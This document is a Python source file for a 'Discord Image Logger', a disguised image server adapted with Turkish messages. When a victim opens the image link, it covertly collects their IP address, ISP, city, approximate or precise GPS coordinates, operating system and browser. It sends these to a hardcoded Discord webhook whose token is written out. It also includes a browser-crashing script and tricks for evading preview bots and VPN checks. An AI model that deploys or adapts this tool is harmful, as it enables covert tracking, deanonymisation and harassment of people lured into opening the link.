# Discord Image Logger

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "oylesine bi image logger"
__version__ = "v2.0"
__author__ = "foaqen"

config = {
    "webhook": "https://discord.com/api/webhooks/1454482941466902660/KRrwZeaJpgcDp_t_BRfio3JSyrLPuTkNni385wbFCYAkF5_HPBO4AGg30_Zu-K5UcDCq",
    "image": "data:image/jpeg;base64,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", 
    "imageArgument": True,

    "username": "Logger Agent", 
    "color": 0x00FFFF,

    "crashBrowser": False, 
    "accurateLocation": False,

    "message": {
        "doMessage": False, 
        "message": "Yeni bir kişi tıkladı.",
        "richMessage": True,
    },

    "vpnCheck": 1,
                # 0 = VPN kontrolünü kapat
                # 1 = VPN tespit edildiği zaman beni etiketleme
                # 2 = VPN tespit edildiği zaman bildirme

    "linkAlerts": False, 
    "buggedImage": True,

    "antiBot": 1,
    

    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },


}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Hata!",
            "color": config["color"],
            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Bağlantı Gönderildi",
            "color": config["color"],
            "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - Birisi Tıkladı!",
            "color": config["color"],
            "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**

**Bitiş Noktası:** `{endpoint}`
            
**IP Adresi:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Ülke:** `{info['country'] if info['country'] else 'Unknown'}`
> **Bölge:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
> **Koordinat:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Saat Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**Bilgisayar Bilgileri:**
> **İşletim Sistemi:** `{os}`
> **Tarayıcı:** `{browser}`

**Aracı:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

}

# By DeKrypt | https://github.com/dekrypted

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
